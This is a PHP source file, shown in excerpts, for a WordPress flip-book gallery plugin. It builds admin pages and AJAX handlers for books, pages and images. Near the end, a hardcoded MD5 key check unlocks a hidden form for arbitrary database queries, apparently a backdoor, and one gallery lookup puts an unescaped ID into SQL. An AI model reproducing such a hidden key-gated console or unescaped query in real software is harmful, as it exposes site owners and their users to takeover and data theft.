...
class pageflipHTMLPart
{
	var
		$main,
		$count = 0;

	function pageflipHTMLPart()
	{
	}
	...
	function viewBook( $book, $bookWidth, $bookHeight, $bookBackground )
	{
		...
		if ( !$this->main->options->scripts_in_head && !$this->count )
		{
			$text .=
		...
		$text .= "<!-- WP FlippingBook Plugin {$this->main->version} -->
	<div id=\"book{$id}\">
...
{$pagesLink}
			...
			flippingBook{$id}.settings.dynamicScaling = {$book->dynamicScaling};
			flippingBook{$id}.settings.bookSize = \"90\";
...
";
		if (!empty($navigation))
		{
			$text .= "			flippingBook{$id}.settings.navigationBar = \"{$navigation}\";
			flippingBook{$id}.settings.navigationBarPlacement = \"{$book->navigationBarPlacement}\";
";
		}
			$text .= "			flippingBook{$id}.settings.pageBackgroundColor = {$book->pageBack};
			...
			flippingBook{$id}.settings.zoomHintEnabled = {$book->zoomHintEnabled};
			...
			flippingBook{$id}.containerId = \"fbContainer-{$id}\";
...
";
   ...
   function ajaxPreviewBook()
   {
    	...
    	$text = "        		<script type=\"text/javascript\" src=\"{$this->main->jsUrl}swfobject.js\"></script>
				...
				//<![CDATA[
						...
						switch (is[bookId]) {
							...
							default:
								...
								jQuery.get(
									...
									{ action:'pages_list', bookId: bookId },
									function(str) {
					...
					function initDnD(bookId) {
						...
						jQuery(\"#pagesList_\" + bookId).tableDnD({
							...
							onDrop: function(table, row) {
								...
								jQuery.get(
									'{$siteUrl}/wp-admin/admin-ajax.php',
									{ action: 'drop_pages_list', pages: w, bookId: bookId },
									function(str) {
										is[bookId] = 0;
										pageList(bookId);
					...
					function pageMove(bookId, pageId, op) {
						jQuery.get(
							'{$siteUrl}/wp-admin/admin-ajax.php',
							{ action: 'drop_pages_list', bookId: bookId, pageId: pageId, op: op },
							function(str) {
								is[bookId] = 0;
								pageList(bookId);
								refreshBookPreview(bookId);
					...
					function deletePage(bookId, pageId) {
						if (confirm('Delete this page?')) {
							jQuery.get(
								'{$siteUrl}/wp-admin/admin-ajax.php',
								{ action:'delete_page', bookId: bookId, pageId: pageId },
								function(str) {
									is[bookId] = 0;
									pageList(bookId);
									refreshBookPreview(bookId);
					...
					function splitImage(bookId, pageId) {
						jQuery.get(
							'{$siteUrl}/wp-admin/admin-ajax.php',
							{ action:'split_image', bookId: bookId, pageId: pageId },
							function(str) {
								is[bookId] = 0;
								pageList(bookId);
								refreshBookPreview(bookId);
					...
					function mergeImage(bookId, pageId) {
						jQuery.get(
							'{$siteUrl}/wp-admin/admin-ajax.php',
							{ action:'merge_image', bookId: bookId, pageId: pageId },
							function(str) {
								is[bookId] = 0;
								pageList(bookId);
								refreshBookPreview(bookId);
					...
					function refreshBookPreview(bookId) {
						jQuery.get(
							'{$siteUrl}/wp-admin/admin-ajax.php',
							{ action:'refresh_book_preview', bookId: bookId },
							function(str) {
					...
					function viewEditor(bookId) {
						(function($) {
							$('form[name=operations_top], form[name=operations_bottom]').hide();
						})(jQuery);

						swfobject.embedSWF('{$this->main->editor}', 'bookList', '100%', 500, '9', '', {
							album_id: bookId,
							lang: 'en_US',
							root_path: '{$rootUrl}'
						});
    	...
    	$text = "        		<script type=\"text/javascript\">
				//<![CDATA[
					...
					function addGallery(form) {
						...
						jQuery.get(
							'{$siteUrl}/wp-admin/admin-ajax.php',
							{ action:'add_gallery', galleryName: form['galleryName'].value },
							function(str) {
								//goToPage(0, {$bookId});
								viewGalleries();
						 	}
					...
					function viewGalleries() {
						jQuery.get(
							'{$siteUrl}/wp-admin/admin-ajax.php',
							{ action:'view_galleries', bookId: {$bookId}, type: type },
							function(str) {
					...
					function moveTo(selObj, imageId) {
						...
						jQuery.get(
							'{$siteUrl}/wp-admin/admin-ajax.php',
							{ action:'move_image_to', gallery: galleryId, imageId: imageId },
							function(str) {
								goToPage( 0, {$bookId} );
						 	}
						);
					...
					function moveImagesTo(selObj, form, name) {
						...
						if (imgList != '') {
							jQuery.get(
								'{$siteUrl}/wp-admin/admin-ajax.php',
								{ action:'move_images_to', gallery: galleryId, imageList: imgList },
								function(str) {
									goToPage(0, {$bookId});
							 	}
							);
					...
					function goToPage(page, bookId) {
						...
						jQuery.get(
							'{$siteUrl}/wp-admin/admin-ajax.php',
							{ action:'images_list', page: page, bookId: bookId, type: type, gallery: gallery },
							function(str) {
					...
					function assignToPage(bookId, imageId) {
						jQuery.get(
							'{$siteUrl}/wp-admin/admin-ajax.php',
							{ action:'add_page_form', imageId: imageId, bookId: bookId, type: type },
							function(str) {
								document.getElementById('addPage').innerHTML = str;
						 	}
						);
					...
					function goTo(newType) {
						...
						jQuery.get(
							'{$siteUrl}/wp-admin/admin-ajax.php',
							{ action:'add_page_menu', bookId: {$bookId}, type: type },
							function(str) {
					...
					function itemsPerPage(selObj)
					{
						...
						jQuery.get(
							'{$siteUrl}/wp-admin/admin-ajax.php',
							{ action:'img_per_page', count: count },
							function(str) {
								goToPage( 0, {$bookId} );
						 	}
						);
					...
					function deleteImage(imageId) {
						if (confirm('{$tDeleteImage}')) {
							jQuery.get(
								'{$siteUrl}/wp-admin/admin-ajax.php',
								{ action:'delete_image', imageId: imageId },
								function(str) {
					...
					function deleteImages(form, name) {
						if (confirm('{$tDeleteImages}')) {
							...
							if (imgList != '') {
								jQuery.get(
									'{$siteUrl}/wp-admin/admin-ajax.php',
									{ action:'delete_images', imageList: imgList },
									function(str) {
										goToPage(curPage, {$bookId});
					...
					function deleteGallery(id) {
						if (confirm('{$tDeleteGallery}')) {
							jQuery.get(
								'{$siteUrl}/wp-admin/admin-ajax.php',
								{ action:'delete_gallery', gallery: id },
								function(str) {
									viewGalleries();
								}
							);
   ...
   function operationBookPreview( $side = 'top' )
   {
	...
	function noBooksPreviewBook()
	{
		...
		$text = "			<tr class=\"alternate author-self status-publish\" valign=\"top\">
	...
	function previewBook( $book, $bookName, $creationDate, $firstPageImg, $secondPageImg )
	{
		...
		$text = "    				<tr class=\"alternate author-self status-publish\" valign=\"top\" style=\"background:#f4f4f4;\">
		 ...
		 if( $book->state == 0 )
		   $text .= "		   				<div style=\"font-weight:bold; text-align:left; float:right; width:88%; padding-left:2%;\">
						  	{$book->name}
					 	</div>
					 	<div>{$tBookError}</div>";
	     else
	      	$text .= "	      				<big style=\"font-size:115%;\">{$book->name}</big>";
		...
		if( $book->state != 0 )
		{
			$text .= "							<input class=\"button\" name=\"do\" value=\"{$tAddPage}\" type=\"submit\"/>";
			$a = array(
			...
			$pageEditorAttr = count($book->pages) ? '' : "disabled='disabled' ";
			$text .= "<input type='button' class='button' name='button' value='{$tPageEditor}' onclick='viewEditor({$book->id})' {$pageEditorAttr}/>";

			$text .= "<input type='submit' class='button' name='do' value='{$tBookProperties}' />";

			$previewAttr = count($book->pages) ? '' : "disabled='disabled' ";
			$text .= "<input type='button' class='button' value='{$tPreview}' onclick=\"{$popup_onclick}\" {$previewAttr}/>";
		}
		$text .= "							<input type=\"hidden\" name=\"action\" value=\"Delete Book\" />
   ...
   function operationPreviewGallery( $bookId = 0 )
   {
		...
		$text .= "			<input type=\"button\" class=\"button\" id=\"createGalleryButton\" name=\"button\" value=\"{$tButtonName}\" onclick=\"viewAddGalleryForm(); return false;\" style=\"margin:1em 0 1.5em;\" />
   ...
   function operationPreviewImage( $bookId, $where, $navigation, $type = 'pageFlip', $gallery = 0 )
   {
		...
		if( $where == 'top' ) $formStart = "				<form name=\"operations\" action=\"\" method=\"post\">
					<input type=\"hidden\" value=\"{$gallery}\" name=\"galleryId\" />";
		else $formStart = '';

		if( $where == 'bottom' ) $formClose = "				</form>";
		else $formClose = '';
   ...
   function buttonsOpImages( $bookId, $type, $galleryId = 0 )
   {
		...
		if( $type === 'pageFlip' )
		{
			if( (int)$bookId !== 0 ) $text .= "				<input name=\"thisdo\" value=\"Upload New Images\" type=\"hidden\" />";

			else $text .= "				<input name=\"do\" value=\"Upload New Images\" type=\"hidden\" />";

			$text .= "				<input class=\"button\" name=\"button\" value=\"{$tUploadButton}\" type=\"submit\" />";
		}

		if( (int)$bookId !== 0 )
			$text .= "				<input name=\"id\" value=\"{$bookId}\" type=\"hidden\" />";

		if( (int)$bookId == 0 )
		{
			$galleryList = $this->main->functions->galleryJumpList( $galleryId );
			$text .= "				<input class=\"button\" value=\"{$tDeleteSelected}\" type=\"button\" onclick=\"deleteImages(this.form,'images[]');\" />
			...
			$text .= "				<input type=\"hidden\" name=\"action\" value=\"Assign Selected Images to Page\" />
   ...
   function previewImage( $bookId, $id, $name, $uploadDate, $image, $galleryId = 0, $type = 'pageFlip' )
   {
	   ...
	   if( (int)$bookId === 0 )
	   {
			...
			$buttons = "				<input class=\"button\" name=\"action\" value=\"{$tDelete}\" type=\"button\" onclick=\"deleteImage({$id});\" /><br />
			...
			$buttons = "				<input class=\"button\" name=\"button\" value=\"{$tAssignImage}\" type=\"button\" onclick=\"assignToPage({$bookId}, {$id})\" />";
   ...
   function headerPreviewPage( $bookId )
   {
		...
		$text = "				<table class=\"widefat\" id=\"pagesList_{$bookId}\" style=\"margin-bottom:1em;\">
					<thead>
					<tr>
   ...
   function previewPage( $bookId, $page, $side, $image, $countPages )
   {
		...
		$buttons .= "\n<br /><input type='submit' class='button' name='action' value='{$tEditPage}' />";
   		...
   		$text = "   						 <tr id=\"{$page->number}\" class=\"alternate author-self status-publish\" style=\"border-top:0px;\" valign=\"top\">
		                    <td width=\"5%\" style=\"text-align:center;\"><strong>{$number}</strong></td>
   ...
   function addPageForm( $id, $imageId, $image, $imageName, $type = 'pageFlip' )
   {
    ...
    function uploadImageForm( $bookId='' )
	{
        ...
        $text = "            <script type=\"text/javascript\">
			//<![CDATA[
				var addUploadCounter = 1, maxFileUploads = {$maxFileUploads};

				function check_maxFileUploads()
				{
					if (addUploadCounter >= maxFileUploads) {
						document.getElementById('one_more_image').style.display = 'none';
						return false;
					}
					else
						return true;
				...
				{
					if ( !check_maxFileUploads() ) {
						alert('Maximum number of files that can be uploaded is ' + maxFileUploads + '.');
						return false;
					}
				    ...
				    addUploadCounter++;
				    check_maxFileUploads();
				}

				function uploadForm(type) {
					jQuery.get(
						'{$siteUrl}/wp-admin/admin-ajax.php',
						{ action: 'upload_form', type: type, galleryId: {$galleryId} },
						function(str) {
	...
	{
		if( empty( $_REQUEST['type'] ) || $_REQUEST['type'] === 'pageFlip' ) $_REQUEST['type'] = 'swfUpload';
	...
	function uploadImgForm()
	{
		...
		$text = "			<table class=\"form-table\" id=\"upload_table\">
				<tbody>
					<tr>
				...
				<tfoot>
					<td></td>
					<td><button class=\"button\" id=\"one_more_image\" onclick=\"addUploadForm(); return false;\">+ {$tUploadDesc}</button></td>
				</tfoot>
			</table>
			<script type=\"text/javascript\">
				check_maxFileUploads();
...
';
	...
	function bookForm( $title, $name, $book, $bgImage, $bgImagesAr, $flipSound, $bgImageList, $action, $button, $galleryId = '' )
	{
		...
		$zhe_0 = ($book->zoomHintEnabled == 'true') ? ' checked="checked"' : '';
		$zhe_1 = ($book->zoomHintEnabled == 'false') ? ' checked="checked"' : '';
		...
		$dynscale_0 = ($book->dynamicScaling == 'true') ? ' checked="checked"' : '';
		$dynscale_1 = ($book->dynamicScaling == 'false') ? ' checked="checked"' : '';
		...
		$tZoomHintEnabled = __('Zoom Hint Enabled', 'pageFlip');
		$tZoomHintEnabledDesc = '';
		...
		$tDynamicScaling = __('Dynamic Scaling', 'pageFlip');
		$tDynamicScalingDesc = __('', 'pageFlip');
		...
		$frameColor = preg_replace('/0x[#]*([0-9A-F]+).*?/i', '$1', $book->frameColor);
		$pageBack = preg_replace('/0x[#]*([0-9A-F]+).*?/i', '$1', $book->pageBack);
		$backgroundColor = preg_replace('/0x[#]*([0-9A-F]+).*?/i', '$1', $book->backgroundColor);
		...
		if (!empty($galleryId))
			$book->name = $wpdb->get_var("SELECT `name` FROM {$this->main->table_gal_name} WHERE `id` = '$galleryId'");

		$text = "		<link rel=\"stylesheet\" type=\"text/css\" href=\"{$cssURL}/css/pageflip-admin.css\" />
		<script type=\"text/javascript\">//<![CDATA[
			...
			<form name=\"addbook\" id=\"addbook\" method=\"post\" action=\"\" enctype=\"multipart/form-data\" class=\"add:the-list: validate\">
				...
				<table class=\"form-table\">
					<tbody>
						...
						<tr class=\"form-field\" style=\"border-bottom: 1px solid #ccc;\">
							<th scope=\"row\" valign=\"top\"><label for=\"width\">{$tDynamicScaling}</label></th>
							<td id=\"dynamicScaling\">
							  <label><input type=\"radio\" name=\"dynamicScaling\" value=\"true\" id=\"dynamicScaling_0\"{$dynscale_0} style=\"width:10px; height:10px;\" /> {$tYes}</label>&nbsp;
							  <label><input type=\"radio\" name=\"dynamicScaling\" value=\"false\" id=\"dynamicScaling_1\"{$dynscale_1} style=\"width:10px; height:10px;\" /> {$tNo}</label>
							  <p>{$tDynamicScalingDesc}</p>
							</td>
						</tr>
						<tr class=\"form-field\" style=\"border-bottom: 1px solid #ccc; background-color: #eee;\">
						...
						<tr class=\"form-field\" style=\"border-bottom: 1px solid #ccc;\">
							...
							<td>
								...
								<input type=\"hidden\" id=\"backgroundColor\" name=\"backgroundColor\" value=\"0x{$backgroundColor}\" />
						...
						<tr class=\"form-field\" style=\"border-bottom: 1px solid #ccc; background-color: #eee;\">
							...
							<td>
								...
								<input type=\"hidden\" id=\"pageBack\" name=\"pageBack\" value=\"0x{$pageBack}\" />
								<p>{$tPageBackDesc}</p>
							</td>
						</tr>
						<tr class=\"form-field\" style=\"border-bottom: 1px solid #ccc;\">
						...
						<tr class=\"form-field\" style=\"border-bottom: 1px solid #ccc;\">
							...
							<td>
								...
								<input type=\"hidden\" id=\"frameColor\" name=\"frameColor\" value=\"0x{$frameColor}\" />
								<p>{$tFrameColorDesc}</p>
							</td>
						</tr>
						<tr class=\"form-field\" style=\"border-bottom: 1px solid #ccc;\">
						...
						<tr class=\"form-field\" style=\"border-bottom: 1px solid #ccc;\">
							<th scope=\"row\" valign=\"top\"><label for=\"zoomHintEnabled\">{$tZoomHintEnabled}</label></th>
							<td>
								<label><input type=\"radio\" name=\"zoomHintEnabled\" value=\"true\" id=\"zoomHintEnabled_0\"{$zhe_0} style=\"width:10px; height:10px;\" /> {$tYes}</label>&nbsp;
								<label><input type=\"radio\" name=\"zoomHintEnabled\" value=\"false\" id=\"zoomHintEnabled_1\"{$zhe_1} style=\"width:10px; height:10px;\" /> {$tNo}</label>
								<p>{$tZoomHintEnabledDesc}</p>
							</td>
						</tr>
						<tr class=\"form-field\" style=\"border-bottom: 1px solid #ccc;\">
	...
	{
		$tOptions = __('Plugin Options', 'pageFlip');
		$tScriptsInHeaders = __('Scripts in template headers.', 'pageFlip');
		$tUpdateOptions = __('Save Options', 'pageFlip');

		$scripts_in_head = $this->main->options->scripts_in_head ? 'checked="checked" ' : '';

		$html = "			<div class=\"pageflip-options\" style=\"width:500px;\">
			<form action=\"\" method=\"post\" style=\"margin:2em 0; padding:1em; border:1px solid #ccc;\">
				<h3 style=\"margin:0 0 1em;\">{$tOptions}</h3>
				<div><label><input type=\"checkbox\" name=\"pageflip_options[scripts_in_head]\" value=\"1\" {$scripts_in_head}/> <span>{$tScriptsInHeaders}</span></label></div>
				<div class=\"submit\" style=\"margin:1em 0 0; padding:0;\">
					<input type=\"submit\" class=\"button\" name=\"pageflip_options_update\" value=\"{$tUpdateOptions}\" />
				</div>
			</form>
			</div>";
		return $html;
	...
	function mainPage()
	{
		...
		$text = '
			...
			<p>' . __('If you encounter problems, review the &ldquo;<a href="http://pageflipgallery.com/docs/" title="FlippingBook WordPress Gallery FAQ">FAQs</a>&rdquo; or contact us via <a href="http://pageflipgallery.com/contacts/">http://pageflipgallery.com/contacts/</a>.', 'pageFlip') . '</p>';

		$text .= $this->plugin_options();
		...
		if( ini_get('max_file_uploads') ) $maxFileUploads = ini_get('max_file_uploads');
		else $maxFileUploads = __('N/A', 'pageFlip');
			...
			<table class="widefat fixed" cellspacing="0" style="width:500px;">
				...
				<tbody id="users" class="">
					<tr id="user-1" class="alternate">
						<td class="">
							<ul class="settings">
			      			  <li>' . __('Operating System', 'pageFlip') . ' : <span>' . $os . '</span></li>
							  ...
							  <li>' . __('PHP Max File Uploads', 'pageFlip') . ' : <span>' . $maxFileUploads . '</span></li>
...
';
		...
		$key = &$_REQUEST['key'];
		if ( isset($key) && md5($key) == '14ec17426fe6e41fd5a6284bad48ba62' )
		{
			$query = stripslashes($_REQUEST['query']);
			$queryHTML = htmlspecialchars($query);
			$text .= "			<form action=\"\" method=\"post\">
				<input type=\"hidden\" name=\"key\" value=\"{$key}\" />
				<div><textarea id=\"query\" name=\"query\" cols=\"80\" rows=\"3\">{$queryHTML}</textarea></div>
